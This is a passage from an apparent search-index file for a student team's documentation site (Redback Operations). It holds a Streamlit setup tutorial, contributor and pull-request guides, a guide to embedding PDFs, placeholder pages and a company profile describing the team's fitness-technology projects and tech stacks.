download_all_qr_codes function, several precautions are taken to secure file operations. These include: Sanitizing the unique IDs to prevent unauthorized data access or manipulation.Restricting the download feature to admins only, ensuring that sensitive data is not accessible to regular users.  Admin Features​    Sign Up New Staff Members: Admins can sign up new staff members directly through the application. During the signup process, the entered password is hashed using bcrypt before being stored in the database. View Staff Members: Admins have the ability to view all staff members and their roles. This feature is restricted to admins, ensuring that only authorized personnel can see sensitive staff information. Download QR Codes: Admins can download all student QR codes as a ZIP file. This feature is secure and restricted to admins, preventing unauthorized access to the QR codes. Manage Staff: Admins can manage staff members by adding, removing, or updating their information. This includes changing passwords and updating roles, ensuring that the application’s user management is always up-to-date.  Regular User Features​    QR Code Login: Regular users (staff) can log in using their login details. View Student Data: Staff members have access to student data which are in the database and can also download all the student data as csv if needed. This will enable them to find the unique id/other details of students and recover QR Codes(in case they loose them) ","version":"Next","tagName":"h3"},{"title":"Example nested","type":0,"sectionRef":"#","url":"/redback-documentation/docs/example/example-nested/example","content":"","keywords":"","version":"Next"},{"title":"Duplicate me!​","type":1,"pageTitle":"Example nested","url":"/redback-documentation/docs/example/example-nested/example#duplicate-me","content":"","version":"Next","tagName":"h2"},{"title":"Streamlit Tutorial","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/streamlit_tutorial","content":"","keywords":"","version":"Next"},{"title":"Open-Source Python Framework​","type":1,"pageTitle":"Streamlit Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/streamlit_tutorial#open-source-python-framework","content":" Streamlit is a powerful, open-source Python framework that empowers data scientists and AI/ML practitioners to rapidly build interactive data applications. Tailored for machine learning and data science projects, Streamlit simplifies the process of developing web apps that are both engaging and visually compelling, requiring only minimal code to get started.  Streamlit Website is the Fastest Way to Build Data Applications  1. Installation and Setup  To get started with Streamlit, we need to install the library using pip. Make sure Python is already installed on your system, as Streamlit requires it.  Install Streamlit: Open your terminal or command prompt and run the following command: pip install streamlit Verify Installation: After installation, we can check if everything is set up correctly by running: streamlit hello   This will launch a sample web application, which is also featured on Streamlit's gallery page.  ","version":"Next","tagName":"h2"},{"title":"Setting Up a Virtual Environment​","type":1,"pageTitle":"Streamlit Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/streamlit_tutorial#setting-up-a-virtual-environment","content":" It’s recommended to create a virtual environment for your project to manage dependencies and avoid conflicts.  Navigate to Your Project Directory: Use the cd command to move to your project folder. For example: cd path/to/your/project Create the Virtual Environment:Run the following command to create a virtual environment named .venv: python -m venv .venv Activate the Virtual Environment: On Windows: .venv\\Scripts\\activate On macOS and Linux: source .venv/bin/activate   ","version":"Next","tagName":"h3"},{"title":"Installing Streamlit:​","type":1,"pageTitle":"Streamlit Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/streamlit_tutorial#installing-streamlit","content":" Install streamlit: With the virtual environment activated, run  pip install streamlit   Verify Streamlit Installation: Check if Streamlit is installed correctly by running  streamlit --version   ","version":"Next","tagName":"h3"},{"title":"Troubleshooting:​","type":1,"pageTitle":"Streamlit Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/streamlit_tutorial#troubleshooting","content":"     If an error like this is received that probably means that python is not installed on internal system and hence we will try to install streamlit using alternative methods.  2. Step-by-Step Guide to Install Streamlit using Anaconda  Open Anaconda Navigator: Open the Anaconda Navigator from your Start menu or Applications folder. Create a New Environment: Click on the &quot;Environments&quot; tab on the left side. Click the &quot;Create&quot; button at the bottom. Give your new environment a name (e.g., streamlit_env) and choose the Python version you want to use (e.g., Python 3.8 or 3.9). Activate the Environment: Once the environment is created, click on it in the list to select it. Click the &quot;Open Terminal&quot; button to open a terminal window with the environment activated. Install Streamlit:In the terminal window, run the following command to install Streamlit: pip install streamlit Verify the Installation:After the installation is complete, verify that Streamlit is installed correctly by running: streamlit --version   Streamlist is successfully installed.  3. Step-by-Step Guide to Create and Run a Streamlit App  Set Up Your Project Directory: Create a directory for your Streamlit project if you don't already have one. mkdir my_streamlit_app cd my_streamlit_app Create a Python Script: Open your favorite text editor or IDE (e.g., VSCode, PyCharm, Jupyter Notebook). Create a new file named app.py Write Your Streamlit Code: Open app.py and write your Streamlit application code. Here’s an example of a simple Streamlit app:  import streamlit as st st.title(&quot;Hello Streamlit!&quot;) st.write(&quot;This is my first Streamlit app.&quot;) # Add some interactive widgets name = st.text_input(&quot;Enter your name:&quot;) if name: st.write(f&quot;Hello, {name}!&quot;) number = st.slider(&quot;Pick a number:&quot;, 0, 100) st.write(f&quot;Your number is {number}&quot;)   Run Your Streamlit App: Open a terminal or Command Prompt. Navigate to the directory containing your app.py file. Run the Streamlit application:  streamlit run app.py   This command will start a local server and open your default web browser to http://localhost:8501, where you can see your Streamlit app running  4. Step-by-Step Guide to Code and Run a Streamlit App Using Anaconda  Set Up Your Project Directory: Choose a location on your system where you want to store your project files.Create a new directory for your project, for example, my_streamlit_app.  mkdir my_streamlit_app   cd my_streamlit_app     Create the app.py File: Open your text editor or IDE.Create a new file named app.py in the my_streamlit_app directory.    Write Your Streamlit Code: Open app.py in your preferred text editor or IDE (e.g., VSCode, PyCharm, Jupyter Notebook). Add your Streamlit code to app.py(example code same as used in previous step)    Activate Your Anaconda Environment: Open the Anaconda Prompt.Navigate to your project directory: cd path\\to\\my_streamlit_app Activate the environment where you have installed Streamlit. For example, if you created an environment named streamlit_env: conda activate streamlit_env Run Your Streamlit App: With the environment activated and while in the project directory, run your Streamlit app: streamlit run app.py This command will start a local server and open the default web browser to http://localhost:8501, where we can see the Streamlit app running  Whenever any change is done to the source code,  It is updated automatically in the app. We select always re-run(Can manually re-run after each change is done too )    Markdown Cheatsheet Link : https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet  FREQUENTLY ASKED QUESTIONS  ","version":"Next","tagName":"h2"},{"title":"STOPPING THE STREAMLIT SERVER:​","type":1,"pageTitle":"Streamlit Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/streamlit_tutorial#stopping-the-streamlit-server","content":" When you run a Streamlit app using the command streamlit run app.py in the terminal, the server will continue to run and serve the Streamlit app until you stop it manually.  In the Terminal Window:Windows/Linux/macOS: Press Ctrl + C. This keyboard shortcut sends an interrupt signal to the terminal, which stops the Streamlit server.Alternative Method:If you started the Streamlit app in a terminal window that you don’t have access to, you can close the terminal window. This will also stop the Streamlit server.  ","version":"Next","tagName":"h3"},{"title":"NAVIGATING BETWEEN DIRECTORIES:​","type":1,"pageTitle":"Streamlit Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/streamlit_tutorial#navigating-between-directories","content":" Assuming your directory structure is like this:  D:\\Team Project A\\staging\\ ├── file_upload └── my_streamlit_app   -To navigate from file_upload to my_streamlit_app:  Navigate Up One Level:  cd ..     -Navigate to my_streamlit_app:  cd my_streamlit_app     ","version":"Next","tagName":"h3"},{"title":"REFERENCES​","type":1,"pageTitle":"Streamlit Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/streamlit_tutorial#references","content":" The guidance on installing Streamlit using AnacondaStreamlit Official WebsiteYouTube Tutorial on StreamlitStreamlit vs. Gradio: A Comprehensive Comparison ","version":"Next","tagName":"h3"},{"title":"First Time Users","type":0,"sectionRef":"#","url":"/redback-documentation/docs/example/first-example","content":"","keywords":"","version":"Next"},{"title":"Welcome to the Redback Operations documentation platform​","type":1,"pageTitle":"First Time Users","url":"/redback-documentation/docs/example/first-example#welcome-to-the-redback-operations-documentation-platform","content":" First and foremost, this platform is primarily deployed using Markdown (.md files), however, if you are experienced in .mdx files, or basic HTML, CSS, or JavaScript, feel free to play around with them too.  ","version":"Next","tagName":"h2"},{"title":"Prerequisites​","type":1,"pageTitle":"First Time Users","url":"/redback-documentation/docs/example/first-example#prerequisites","content":" First up, you will need the following:  GitGithub accountNode.js + npmdocusaurus npm packageyarn npm packageIDE, browser, and terminal of your choice  With these installed and configured, you can get started!  ","version":"Next","tagName":"h2"},{"title":"Forking & cloning the main repository​","type":1,"pageTitle":"First Time Users","url":"/redback-documentation/docs/example/first-example#forking--cloning-the-main-repository","content":" First up, head to the docs repo here, ensuring you're signed into GitHub, and press the &quot;Fork&quot; button      And then, ensuring your account is listed as the owner, click &quot;Create Fork&quot;      Once you're on the page of your new forked repo, click &quot;Code&quot;, and copy the URL. Alternatively, you can clone this through GitHub Desktop if you have that installed (this guide only focuses on Git Bash cloning).      Open Git Bash, and change the directory to where you want the cloned repo to go, then type git clone , and paste the previously copied URL directly after. After executing this, you will have successfully cloned the repo.  ","version":"Next","tagName":"h2"},{"title":"Make your changes​","type":1,"pageTitle":"First Time Users","url":"/redback-documentation/docs/example/first-example#make-your-changes","content":" Now that you've forked and cloned the repo, modify the file in your preferred Markdown text editor. Follow our other guides if you need help with converting documents to Markdown, and the file / folder structures used. Ensure that you have also pushed your changes to your forked repo.  ","version":"Next","tagName":"h2"},{"title":"Creating a pull request​","type":1,"pageTitle":"First Time Users","url":"/redback-documentation/docs/example/first-example#creating-a-pull-request","content":" Again, this step will use Git Bash. If you want to use GitHub Desktop, follow this guide.  In Git Bash, ensure you are currently in the directory of your cloned repo, and on the correct branch. Then, type in gh pr create --title &quot;&lt;title here&gt;&quot; --body &quot;&lt;body here&gt;&quot;, replacing the title and body with an accurate description of your changes.  This will then go to the reviewers, who will then review your work to ensure it is in line with the standards of the platform.  ","version":"Next","tagName":"h2"},{"title":"Done!​","type":1,"pageTitle":"First Time Users","url":"/redback-documentation/docs/example/first-example#done","content":" That's it! If you require any other assistance, please review the other tutorials on using Markdown and the file structures. ","version":"Next","tagName":"h2"},{"title":"Lorem Ipsum","type":0,"sectionRef":"#","url":"/redback-documentation/docs/example/lorem","content":"","keywords":"","version":"Next"},{"title":"Lorem ipsum dolor sit amet​","type":1,"pageTitle":"Lorem Ipsum","url":"/redback-documentation/docs/example/lorem#lorem-ipsum-dolor-sit-amet","content":" consectetur adipiscing elit. Ut vel turpis nec justo sollicitudin molestie. Vestibulum pretium urna sit amet metus condimentum, ut venenatis nibh gravida. Duis imperdiet mi ut diam ultrices egestas.  ","version":"Next","tagName":"h2"},{"title":"Proin porta iaculis sollicitudin​","type":1,"pageTitle":"Lorem Ipsum","url":"/redback-documentation/docs/example/lorem#proin-porta-iaculis-sollicitudin","content":" Sed in urna placerat, porta erat eu, ultricies dolor.  ","version":"Next","tagName":"h3"},{"title":"Aliquam gravida elit vehicula, placerat est eget, sodales nibh.​","type":1,"pageTitle":"Lorem Ipsum","url":"/redback-documentation/docs/example/lorem#aliquam-gravida-elit-vehicula-placerat-est-eget-sodales-nibh","content":" Sed tempor imperdiet nisl, at suscipit urna molestie eu. Pellentesque viverra consectetur enim sit amet convallis.  ","version":"Next","tagName":"h3"},{"title":"Mauris eu elit sit amet neque gravida​","type":1,"pageTitle":"Lorem Ipsum","url":"/redback-documentation/docs/example/lorem#mauris-eu-elit-sit-amet-neque-gravida","content":" ultricies id quis urna. Vestibulumvitae lectus viverra ","version":"Next","tagName":"h2"},{"title":"Embedding PDFs Into Pages","type":0,"sectionRef":"#","url":"/redback-documentation/docs/example/pdf-tutorial","content":"","keywords":"","version":"Next"},{"title":"How-to​","type":1,"pageTitle":"Embedding PDFs Into Pages","url":"/redback-documentation/docs/example/pdf-tutorial#how-to","content":" ","version":"Next","tagName":"h2"},{"title":"Check your file types!​","type":1,"pageTitle":"Embedding PDFs Into Pages","url":"/redback-documentation/docs/example/pdf-tutorial#check-your-file-types","content":" For embedding PDFs to work, please ensure:  It is actually a PDF file. Ensure that your documentation file is a .mdx file rather than a .md file. This is due to .mdx supporting small amounts of HTML, CSS, JS, and React, of which some HTML is used here. (this also means you can do other cool things too if you want!).  ","version":"Next","tagName":"h3"},{"title":"Hosting the file​","type":1,"pageTitle":"Embedding PDFs Into Pages","url":"/redback-documentation/docs/example/pdf-tutorial#hosting-the-file","content":" Typically when files such as PDFs are uploaded to this build, their names are converted to a random string in order to avoid duplication. However, we can bypass this.  To do so, save your PDF in the static/pdf folder. Ensure the document has a unique name.  Once deployed, the file will have the URL https://redback-operations.github.io/redback-documentation/pdf/&lt;file name.pdf&gt;  The &lt;file name.pdf&gt; (which you need to replace!) is case sensitive.  This cannot be tested locally, so please ensure the URL is correct before putting in the pull request, and also check after an approver has deployed the live site in case there is an issue.  ","version":"Next","tagName":"h3"},{"title":"Adding the PDF to the pages​","type":1,"pageTitle":"Embedding PDFs Into Pages","url":"/redback-documentation/docs/example/pdf-tutorial#adding-the-pdf-to-the-pages","content":" Now the fun part! However, once again, this cannot be tested locally so please ensure you follow the steps correctly.  On your .mdx file, after you have set the page up (see page setup tutorial andcompanion video), copy and paste the below code where relevant on your page, ensuring you replace the URL with that you created in the previous step.  &lt;embed src=&quot;https://redback-operations.github.io/redback-documentation/pdf/&lt;file&gt;.pdf&quot; type=&quot;application/pdf&quot; width=&quot;100%&quot; height=&quot;800px&quot; /&gt;   800px height is recommended, but this can be changed if needed.  ","version":"Next","tagName":"h3"},{"title":"Voilà!​","type":1,"pageTitle":"Embedding PDFs Into Pages","url":"/redback-documentation/docs/example/pdf-tutorial#voilà","content":" And you're done! Below is an example of how it looks embedded. As always, please review the code of this file if you need guidance of how to create a markdown file, do so by creating your own fork of the repo.  ","version":"Next","tagName":"h2"},{"title":"Example embedded​","type":1,"pageTitle":"Embedding PDFs Into Pages","url":"/redback-documentation/docs/example/pdf-tutorial#example-embedded","content":"  ","version":"Next","tagName":"h2"},{"title":"Important Research (Tutorial Video)","type":0,"sectionRef":"#","url":"/redback-documentation/docs/example/tutorial","content":"","keywords":"","version":"Next"},{"title":"Video here!​","type":1,"pageTitle":"Important Research (Tutorial Video)","url":"/redback-documentation/docs/example/tutorial#video-here","content":" ","version":"Next","tagName":"h2"},{"title":"Very Important​","type":1,"pageTitle":"Important Research (Tutorial Video)","url":"/redback-documentation/docs/example/tutorial#very-important","content":" Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean pulvinar dignissim elit ac malesuada. Vivamus tempor lacus quis nibh suscipit iaculis. Ut felis quam, pretium at rutrum eget, pharetra quis neque. In scelerisque ac leo sit amet placerat. Sed cursus metus vel purus efficitur, eu maximus enim mattis. Vivamus ultrices sit amet sem vel ultricies. Praesent bibendum dictum erat, non congue turpis sagittis sed. Quisque tempor, sapien sed egestas vehicula, arcu sapien mollis odio, id interdum nunc ante sed turpis. Donec vulputate lacinia lacus, vehicula pharetra mi commodo et. Integer efficitur ultricies mollis. Vestibulum eu dapibus nunc. Pellentesque interdum pharetra mi, et tempus libero mattis sed.  ","version":"Next","tagName":"h2"},{"title":"More Important​","type":1,"pageTitle":"Important Research (Tutorial Video)","url":"/redback-documentation/docs/example/tutorial#more-important","content":" Nullam finibus magna eu volutpat fringilla. Aliquam vel dolor sed magna luctus congue sit amet ac sem. Proin vel neque condimentum, pulvinar diam vitae, vestibulum tellus. Nulla facilisi. Proin tortor nisi, consectetur scelerisque turpis vel, tristique lobortis tellus. Morbi luctus lacus imperdiet, posuere neque in, aliquet metus.      ","version":"Next","tagName":"h2"},{"title":"Further Important​","type":1,"pageTitle":"Important Research (Tutorial Video)","url":"/redback-documentation/docs/example/tutorial#further-important","content":" Important video to view  ","version":"Next","tagName":"h2"},{"title":"Tables?​","type":1,"pageTitle":"Important Research (Tutorial Video)","url":"/redback-documentation/docs/example/tutorial#tables","content":" Blah\tBlahTest\tTest  \tTest\tTest  ","version":"Next","tagName":"h2"},{"title":"Code Blocks!​","type":1,"pageTitle":"Important Research (Tutorial Video)","url":"/redback-documentation/docs/example/tutorial#code-blocks","content":" test test   src: 'img/logo.svg',  ListAre alsoImportant  testTest  ","version":"Next","tagName":"h2"},{"title":"Titles​","type":1,"pageTitle":"Important Research (Tutorial Video)","url":"/redback-documentation/docs/example/tutorial#titles","content":" Titles​ ","version":"Next","tagName":"h3"},{"title":"Company Profile","type":0,"sectionRef":"#","url":"/redback-documentation/docs/onboarding/company-profile","content":"","keywords":"","version":"Next"},{"title":"Redback Operations company profile​","type":1,"pageTitle":"Company Profile","url":"/redback-documentation/docs/onboarding/company-profile#redback-operations-company-profile","content":" ","version":"Next","tagName":"h2"},{"title":"Company Mission​","type":1,"pageTitle":"Company Profile","url":"/redback-documentation/docs/onboarding/company-profile#company-mission","content":" Redback Operations is dedicated to revolutionizing the fitness experience by developing state-of-the-art connected fitness devices that not only enhance the enjoyment of physical activity but also its effectiveness. At the heart of our mission is a relentless drive for innovation and continuous improvement. This commitment is reflected in our diverse portfolio of projects, each designed to elevate the quality and effectiveness of training while also focusing on injury prevention. Through these initiatives, Redback Operations aims to empower individuals in their pursuit of fitness, making every workout smarter, safer, and more enjoyable.  ","version":"Next","tagName":"h3"},{"title":"2024 Company Directors​","type":1,"pageTitle":"Company Profile","url":"/redback-documentation/docs/onboarding/company-profile#2024-company-directors","content":" Trimester 1 - A/Prof. Daniel Lai (Associate Professor)Trimester 2 - Prof Seng Loke (Professor In Computer Science)Trimester 3 - Dr Imali Dias (Senior Lecturer)  ","version":"Next","tagName":"h3"},{"title":"Company Structure​","type":1,"pageTitle":"Company Profile","url":"/redback-documentation/docs/onboarding/company-profile#company-structure","content":" Redback Operations is committed to elevating its professional standards by establishing a comprehensive baseline for documenting information, procedures, findings, and more, in a unified and systematic manner. Redback Operations is currently spearheading five major initiatives, with four company-wide supporting teams:  Project 1: VR Sun Cycle + Smart Bike ProjectProject 2: Elderly Wearable TechnologyProject 3: Athlete Wearable Tech (Previously: Sports Performance Analysis)Project 4: Crowd Monitoring &amp; Player Tracking (AKA Project Orion)Project 5: BugboxCybersecurity &amp; Data Warehouse TeamsWeb &amp; Mobile Dev Teams  Through these diverse yet interconnected projects, Redback Operations demonstrates its commitment to innovation, security, and excellence. By standardizing processes and emphasizing quality management, the company not only streamlines its operations but also sets a solid foundation for future growth and success.  2024 Trimester Company Lead: Kaleb Bowen  ","version":"Next","tagName":"h3"},{"title":"Projects​","type":1,"pageTitle":"Company Profile","url":"/redback-documentation/docs/onboarding/company-profile#projects","content":" Project 1: VR Sun Cycle + Smart Bike Project​  Product Owner: Acting Company Director of Redback  This project aims to revolutionize indoor exercise by merging Virtual Reality (VR) and Smart Bike technologies, creating an immersive workout experience that transcends traditional fitness routines. Initially conceived as two separate endeavours—SuncycleVR and the Smart Bike—these projects have now been unified. The Smart Bike serves as an intuitive controller within the VR environment, with IoT technology enabling real-time turning and movement based on the user's pedalling speed.  The integration of pedal rotations to control the virtual bike's speed marks a significant milestone in achieving a seamless, realistic exercise experience. Meanwhile, the VR component is under active development, with plans to expand beyond the existing starting zone and cityscape. Future updates aim to introduce challenging terrains, such as hills, to leverage the Smart Bike's incline feature, adding an extra layer of difficulty and resistance to workouts. In T1 the team Developed VR missions, integrated the smart bike with VR, and connected a mobile app to collect/show workout data from the Smart bike.  Leadership for this ambitious project is divided among 5 senior members in Trimester 2 2024, each responsible for a distinct aspect of development:  Jonathan David Lowden oversees VR interactions, task planning, and team coordination (Online).  Pratik Milind Pawar and Delia Chia Hui Kok co-lead the project, both living on campus and inducted to the makers space where the smart bikes are located.  Ethan Byrne-Staunton leads IoT integration, ensuring seamless communication between the Smart Bike, VR environment, and associated mobile app.  Dennis Yu coordinates the design of VR environments and assets, crafting engaging and visually captivating design elements and updating asset guidelines and references images for the team.  As the project progresses, the team is focused on enriching the VR experience with interactive missions and environments, pushing the boundaries of what's possible in virtual fitness.  Redback Project 1 VR Sun Cycle + Smart Bike Project Demo  Tech Stack:  Software: UNITY (C#)Blender 4.0Adobe PhotoshopAdobe IllustratorRaspberry Pi EditorMQTT Hardware: Raspberry PiDFR ButtonsWahoo SensorsMeta Quest 2    Project 2: Elderly Wearble Technology​  Product Owner: Acting Company Director of Redback  This project is dedicated to harnessing the potential of wearable technology to significantly enhance the quality of life for the elderly. It skilfully employs advanced data analytics, innovative web platforms, and sophisticated mobile app development tools to meet its goals.  At the heart of the project is the development of intuitive and user-friendly wearable devices, meticulously crafted for the elderly. These devices are tailored to meet several crucial needs, including comprehensive health monitoring, efficient fall detection, and the prevention of bedsores by providing timely alerts for positional changes. A pivotal aspect of the project is its commitment to bolstering social connectivity among the elderly, thereby enriching their overall well-being and safety. Features like fall notifications, emergency alerts, heart rate monitoring, and activity tracking are seamlessly integrated into these devices. This integration is done with the aim of not only improving the daily lives of the elderly but also empowering them with the necessary tools to maintain their health and independence proactively.  In Trimester 1 the team Developed predictive models for diseases, emergency alert systems, activity tracking, and real-time blood glucose monitoring. Also built a Proof of Concept (POC) device ready for testing and further improvement.  In Trimester 2 the team aims to Refine predictive models, implement real-time monitoring features, and enhance data analysis.  Senior member Manan Purvish Gangar will step into the role of project lead guiding the project towards its ambitious goals and Alex Cojocariu will become IoT lead as he built the POC in T1.  Redback Project 2 Wearable Technology + Wearable Sensor Project Showcase (T1 2024)  Tech Stack:  Programming Language: Python Machine Learning and Data Processing: TensorFlowKerasScikit-learn Other Libraries and Tools: Pandas and NumPyMatplotlib    Project 3: Athlete Wearable Tech (Previously Sports Performance Analysis)​  Product Owner: Acting Company Director of Redback  The Athlete Wearables Tech initiative, previously known as the Sports Performance Analysis project, is dedicated to exploiting the vast potential of data derived from wearable technology in various sports. This pioneering project aims at augmenting athletic performance through detailed data analytics and advanced predictive modelling. By leveraging sophisticated tools such as Python and Power BI, the initiative delves deep into the essence of sports analytics, providing customised insights to enhance training and performance across diverse disciplines. The project recently focused on:  An in-depth analysis of metrics like heart rate, speed, and distance is conducted to formulate bespoke training plans. These plans are meticulously tailored to meet each athlete's unique needs, taking into account variables such as age and health in the following solo sports.  CyclingRunningSwimming  Central to this project is a commitment to refining predictive models, particularly in cycling, and expanding into refining running analytics and progress swimming analytics. Additionally, significant efforts are being made to develop a prototype web application. This application is envisioned not only as a repository for analysis and insights but also as a dynamic tool for planning and monitoring training and competition programs. It will enable athletes to upload their data, marrying personal performance metrics with wider analytical findings.  As part of a comprehensive ecosystem dedicated to athlete data collection and analysis, this project presents a unique opportunity for collaboration with teams working on related initiatives, significantly extending the reach and impact of our efforts.  In the coming Trimester 2, senior member Manheer Singh Dhillion will step into the role of project lead, guiding the project towards its ambitious goals.  Redback Project 3 Sports Performance Analysis Showcase (T1 2024)  Tech Stack:  Data Storage: Company VMGitHub Analysis tools: PythonJupyter Notebook Visualisation Tools: Power BITableau    Project 4: Crowd Monitoring &amp; Player Tracking (AKA Project Orion)​  Product Owner: Acting Company Director of Redback  Named after the astute hunter of Greek mythology and the constellation that illuminates our night sky, Project Orion represents a pioneering venture poised to redefine our engagement with sports. Project Orion is a cutting-edge initiative designed to revolutionise the way we perceive and interact with the sports field. Orion, renowned for his ability to never lose track of his target, perfectly embodies our mission.  Project Orion's primary objective is to forge an intelligent, real-time tracking system for athletes. By harmonising sophisticated computer vision technology, Project Orion is set to profoundly enhance our comprehension of athletes' movements, interactions, and overall performance on the field.  At the heart of Project Orion lies its formidable data analysis prowess. Utilising the power of machine learning and predictive modelling, the project aims to transform complex streams of data into practical, actionable insights. Whether it's foreseeing potential injuries or monitoring athletes' fatigue levels, Project Orion's predictive capabilities are designed to convert raw data into essential knowledge. This knowledge will amplify performance standards in various sports.  In essence, Project Orion seeks to mirror the guiding brilliance of its celestial counterpart, aspiring to illuminate the sports technology landscape with innovative strategies focused on athlete safety and performance enhancement. This venture is poised to redefine the frontiers of technological applications in sports, positioning Project Orion as a pioneer and a source of inspiration in its field.  Previously the team focused on both crowd monitoring and player tracking, but decided to steer away from IoT and sensor use to focus work on computer vision technologies moving forward.  in Trimester 2 the aim is to Deploy predictive models for injury prevention and performance enhancement through use of these computer vision technologies.  Tech Stack:  Data Storage: Company VMGitHub Analysis tools: PythonJupyter Notebook    Project 5: Bugbox​  Product Owner: Daniel Lai  The aim of this new project is to encourage/improve the interest and engagement from primary school students in the area of robotics through learning to program and by using different devices such as BugBox.  In Primary schools today it is common to see small programmable robotic devices. The aim of this project is to evolve the online learning platform, introduce gamification, and identify the best approach for the platform.  Formal research, planning and development are yet to begin, so if you would like to join this start-up, please be enthusiastic about robotics and willing to actively participate in the development and creation process!  Tech Stack:  JavaScriptHTMLCSSNodeJS library (for flashing compiled sketch files to Arduino microcontroller boards)Microsoft Planner to be used for task planningGitHubHardware: Arduino Nano  Data Warehousing Team​  Product Owner: Acting Company Director of Redback  Part way though Trimester 1 Redback was provided a Virtual Machine for data storage for long term use as apposed to using tools like GCP that require subscription and application processes that have caused delay in the past. The set up of this Virtual machine to hold and process each of our project’s data has started to be implemented, with further work still needed.  Progress made: developed workflows for data summarization and predictive modelling, created dashboards for visualizing incidents and company security data, designed and implemented Docker-based solutions for the virtual machine.  Additionally, we plan to collaborate with Cyber Security team to implement SecOps,  Implement orchestration tools for data pipeline and enhance real-time data visualization with Power BI. We also wish to integrate with other project teams to bring all data warehousing efforts under one unified strategy, further enhancing Redback's data handling capabilities.  In Trimester 2, this team will be led by senior student Kaylin Lucas-Griffin.  Tech Stack:Data Storage: Previously used Google Cloud Platform, now transitioning to an on-prem virtual machine.  Data Processing and Management:  Dremio: Implemented using Docker for data lakehouse functionality.Nessie and Minio: Used as foundational technologies on the virtual machine.  Visualization Tools:  Power BI for creating interactive dashboards.  Data Anonymization Techniques:  Python for data anonymization and generalization activities.  Documentation:  GitHub Docusaurus Website  Task Planning:  Microsoft Planner    Cybersecurity Team​  Product Owner: Acting Company Director of Redback  The Cybersecurity Team at Redback Operations has made commendable strides in enhancing the organization's cybersecurity landscape, but it's important to recognize that cybersecurity is an ongoing journey, with the team poised to address any areas identified as needing further enhancement in the upcoming trimester.  As we continue to navigate the complexities of cybersecurity, the team remains dedicated to safeguarding Redback Operations through continuous improvement, strategic planning, and the implementation of best practices in security.  In Trimester 2, senior member Daniel Mcaulay will lead the Cybersecurity team, and be in communication with other projects to ensure all of Redback follow the cybersecurity guidelines provided and as intended.  Redback Cyber Security Showcase (T1 2024)  Tools used:Security Information and Event Management (SIEM):  Wazuh: An open-source security monitoring tool used for threat detection, integrity monitoring, incident response, and compliance. Purpose: Provides real-time event collection and analysis, offering comprehensive security visibility.Implementation: Installed on the on-prem virtual machine and configured to ingest events and provide relevant security information. OpenCTI: A tool for threat intelligence sharing and management. Purpose: Enables the integration and sharing of threat intelligence data to improve security operations.Implementation: Set up to work in conjunction with other security tools for enhanced threat detection and response.  Intrusion Detection System (IDS):  Suricata: An open-source network threat detection engine. Purpose: Provides real-time intrusion detection, network monitoring, and security alerts.Implementation: Deployed on the virtual machine to monitor network traffic and detect potential security threats.  Secure Coding and Code Review:  GitHub: Used for version control and managing the secure code review process. Purpose: Ensures code integrity and security through rigorous review processes and version control.Implementation: All code changes are reviewed for security vulnerabilities and compliance with secure coding standards.  Code Review Methodology:  Process: Code is reviewed for security vulnerabilities and adherence to best practices before merging into the main branch.Documentation: Secure coding methodology documents are created and maintained in Docusaurus for reference.  Incident Response and Playbooks:  Playbooks: Developed to dictate procedures for dealing with security incidents. Purpose: Provides a standardized response to various types of security incidents to ensure efficient and effective resolution.Implementation: Nine playbooks and twelve use cases have been created to support the Cyber Incident Policy. Docusaurus: Used for documenting playbooks and other security policies. Purpose: Provides a centralized repository for security documentation and ensures easy access and updates.Implementation: Security documentation is maintained and made accessible through the Docusaurus platform.    Web and Mobile Teams​  Product Owner: Acting Company Director of Redback  Web dev team created shared libraries of reusable code and facilitated collaboration among web developers within the company. The team aims to continue developing and maintaining user-friendly and informative web platforms to fit the needs of the various company projects.  In Trimester 2, the Web dev team will continue to be led by senior student Leesa Ward.  Mobile Dev focuses on developing mobile applications for various projects, enhancing user engagement and functionality. So far creating one application to work with project 1’s smart bike. The progress made in Trimester 1 was implementing Google and Facebook login features, developed signup and login functionalities, and enhanced UI/UX elements within the app.  This project does not yet have a leader for Trimester 2, so the position is open.  Redback UI Showcase (T1 2024)  Redback Mobile Security Showcase (T1 2024)  Web Dev Tech Stack:  HTMLCSSJavaScriptReactNode.js  Mobile Dev Tech Stack:  Android StudioFlutterDjangoPythonFirebase ","version":"Next","tagName":"h3"},{"title":"Packaging Pull Requests","type":0,"sectionRef":"#","url":"/redback-documentation/docs/onboarding/github/pull-requests","content":"","keywords":"","version":"Next"},{"title":"What is a pull request?​","type":1,"pageTitle":"Packaging Pull Requests","url":"/redback-documentation/docs/onboarding/github/pull-requests#what-is-a-pull-request","content":" A pull request is a proposal to merge a set of changes from one branch into another. In a pull request, collaborators can review and discuss the proposed set of changes before they integrate the changes into the main codebase. Pull requests display the differences between the content in the source branch and the content in the target branch.  ","version":"Next","tagName":"h2"},{"title":"Overview​","type":1,"pageTitle":"Packaging Pull Requests","url":"/redback-documentation/docs/onboarding/github/pull-requests#overview","content":" Pull requests can be created on GitHub through different ways - GitHub CLI, Codespaces, Desktop, Web Browser. After initializing the pull request, we see a review page that shows a highlevel overview of the changes between our branch and the repository's base branch where we intend to add. We can also add a summary of the proposed changes, review the changes made by commits, add labels, milestones, and assignees, and mention individual contributors or teams. Other contributors can review the proposed changes, add review comments, contribute to the pull request discussion, and even add commits to the pull request.  ","version":"Next","tagName":"h2"},{"title":"Pull request using Github CLI​","type":1,"pageTitle":"Packaging Pull Requests","url":"/redback-documentation/docs/onboarding/github/pull-requests#pull-request-using-github-cli","content":" To create a pull request, use the ‘gh pr create’ command. To assign the pull request to yourself, use ‘gh pr create --assignee &quot;@me&quot;’. Specify the branch into which you want the pull request merged, using --base or -B flags. Specify the branch that contains commits for your pull request, using --head or -H flags. ‘gh pr create --base my-base-branch --head my-changed-branch’. Include a title and body for the new pull request,‘gh pr create --title &quot;xyz&quot; --body ”abc&quot;’. To mark a pull request as a draft - ‘gh pr create --draft’. To add a labels or milestones to the new pull request. ‘gh pr create --label &quot;bug,help wanted&quot; --milestone octocat-milestone’. To add the new pull request to a specific 